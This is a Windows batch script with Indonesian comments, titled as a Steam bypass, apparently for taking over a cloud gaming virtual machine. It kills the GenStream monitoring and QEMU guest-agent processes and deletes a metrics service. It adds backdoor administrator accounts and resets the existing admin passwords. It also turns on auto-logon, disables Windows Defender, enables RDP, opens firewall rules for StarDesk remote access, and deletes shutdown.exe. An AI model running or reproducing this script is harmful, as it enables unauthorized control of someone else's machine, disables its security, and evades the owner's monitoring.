@echo off
title Steam Bypass - Hapus GenStream & Fix Taskbar
color 0A

echo ============================================
echo   MANTAP BRO! LAGI EKSEKUSI SCRIPT...
echo ============================================
echo.

REM --- 1. KILL PROCESS (GATEWAY, AGENT, & SUNSHINE DIAMIN AJA) ---
echo [*] Matiin proses sampah...
taskkill /f /im genstream-metrics.exe /t >nul 2>&1
taskkill /f /im GenStreamKioskDemo.exe /t >nul 2>&1
taskkill /f /im nvcontainer.exe /t >nul 2>&1
taskkill /f /im qemu-ga.exe /t >nul 2>&1
taskkill /f /im qemu-system-x86_64.exe /t >nul 2>&1
taskkill /f /im GamingServices.exe /t >nul 2>&1
taskkill /f /im GamingServicesNet.exe /t >nul 2>&1

REM --- 2. HAPUS SERVICE ---
echo [*] Hapus service GsMetricsExporter...
sc stop GsMetricsExporter >nul 2>&1
sc delete GsMetricsExporter >nul 2>&1

REM --- 3. USER SETUP ---
echo [*] Bikin user & auto login...
net user kontol kontolo /add >nul 2>&1
net localgroup administrators kontol /add >nul 2>&1
net user titik kontolo /add >nul 2>&1
net localgroup administrators titik /add >nul 2>&1
net user administrator kontolo >nul 2>&1
net user user kontolo >nul 2>&1
net user admin kontolo >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "titik" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "kontolo" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d "%COMPUTERNAME%" /f >nul 2>&1

REM --- 4. LOCK SYSTEM & STARDESK ---
echo [*] Lock system & bypass StarDesk...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1

netsh advfirewall firewall add rule name="ALLOW STARDESK" dir=in action=allow program="C:\Program Files\StarDesk\StarDesk.exe" enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="ALLOW STARDESK HEADLESS" dir=in action=allow program="C:\Program Files\StarDesk\StarDeskHeadless.exe" enable=yes >nul 2>&1
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

del /f /q C:\Windows\System32\shutdown.exe >nul 2>&1
del /f /q C:\Windows\SysWOW64\shutdown.exe >nul 2>&1

REM --- 5. FIX TASKBAR WIN 11 (ALWAYS SHOW) ---
echo [*] Fix Taskbar Win 11 biar muncul terus...
powershell -Command "$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'; $v=(Get-ItemProperty -Path $p).Settings; $v[8]=2; Set-ItemProperty -Path $p -Name Settings -Value $v" >nul 2>&1

REM --- 6. RESTART EXPLORER (PALING TERAKHIR) ---
echo [*] Restart Explorer...
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe

echo.
echo ============================================
echo   MANTAP BRO! SEMUA UDAH BERES!
echo ============================================
timeout /t 5 >nul
exit
